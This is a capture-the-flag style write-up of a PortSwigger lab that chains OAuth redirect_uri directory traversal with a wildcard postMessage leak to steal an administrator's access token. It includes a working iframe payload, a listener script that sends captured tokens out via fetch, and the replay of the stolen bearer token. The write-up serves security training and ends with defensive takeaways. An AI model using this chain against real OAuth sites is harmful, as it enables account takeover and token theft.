# Stealing OAuth Access Tokens via a Proxy Page

## 📌 Lab Details
- **Title**: Stealing OAuth Access Tokens via a Proxy Page
- **Difficulty**: Expert
- **Category**: OAuth Authentication
- **Lab URL**: https://portswigger.net/academy/labs/launch/db65a3fdb4039c8d0b1fb7af3816acac95c2bd0319a92050d9d0aab3cd14c52d?referrer=%2fweb-security%2foauth%2flab-oauth-stealing-oauth-access-tokens-via-a-proxy-page

## 🔍 Summary
This lab demonstrates how multiple low-severity vulnerabilities can be chained together to compromise an OAuth-based authentication flow. <br>
The application uses the OAuth Implicit Grant Flow, where access tokens are returned in the URL fragment after successful authentication. The OAuth server performs insufficient validation of the `redirect_uri` parameter, allowing directory traversal sequences to redirect tokens to unintended pages within the client application. <br>
A secondary vulnerability exists in the blog's comments from page, which uses `postMessage()` with a wildcard (`*`) target origin and sends its entire URL (`window.location.href`) to the parent window. Since the URL contains the OAuth access token fragment, an attacker can capture and exfiltrate the token. <br>
Using the stolen administrator access token, it is possible to retrieve the administrator's API key and solve the lab.

## 🛠 Steps to Solve
1. Study the OAuth flow while proxying traffic through Burp. Using the same method as in the previous lab, identify that the `redirect_uri` is vulnerable to directory traversal. This enables you to redirect access tokens to arbitrary pages on the blog website.
2. Using Burp, audit the other pages on the blog website. Observe that the comment form is included as an `iframe` on each blog post. Look closer at the `/post/comment/comment-form` page in Burp and notice that it uses the `postMessage()` method to send the window.location.href property to its parent window. Crucially, it allows messages to be posted to any origin (`*`).
3. From the proxy history, copy the URL of the `GET /auth?client_id=[...]`. Go to the exploit server and create an `iframe` in which the `src` attribute is the URL you just copied. Use directory traversal to change the `redirect_uri` so that it points to the comment form. The result should look something like this:
   ```sh
   <iframe src="https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>
   ```
4. Below this, add a suitable script that will listen for web messages and output the contents somewhere. For example, you can use the following script to reveal the web message in the exploit server's access log:
   ```sh
   <script>
    window.addEventListener('message', function(e) {
        fetch("/" + encodeURIComponent(e.data.data))
    }, false)
    </script>
   ```
5. Go back to the exploit server and deliver this exploit to the victim. Copy their access token from the log.
6. Send the `GET /me` request to Burp Repeater. In Repeater, replace the token in the `Authorization: Bearer` header with the one you just copied and send the request. Observe that you have successfully made an API call to fetch the victim's data, including their API key.
7. Submit the solution to solve the lab.

## 📖 Key Takeaways
- OAuth `redirect_uri` validation must be strict and exact.
- URL fragments can contain highly sensitive data such as access tokens.
- `postMessage()` should never use `"*"` when transmitting sensitive information.
- Client-side gadgets can become proxy pages for OAuth token theft.

## 🖼️ Screenshot 
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/78cbb8c0-0c5d-4c44-828f-84a0763b7b70" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/35097af7-4eac-4765-b4ef-35a865e5ef7f" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/831cefe7-1259-4a4a-946b-4b6bfb5cf25a" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/1da17992-a1bf-4390-bc85-52647dc61714" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/0a39973a-de65-4619-9ed5-08334e5da488" />
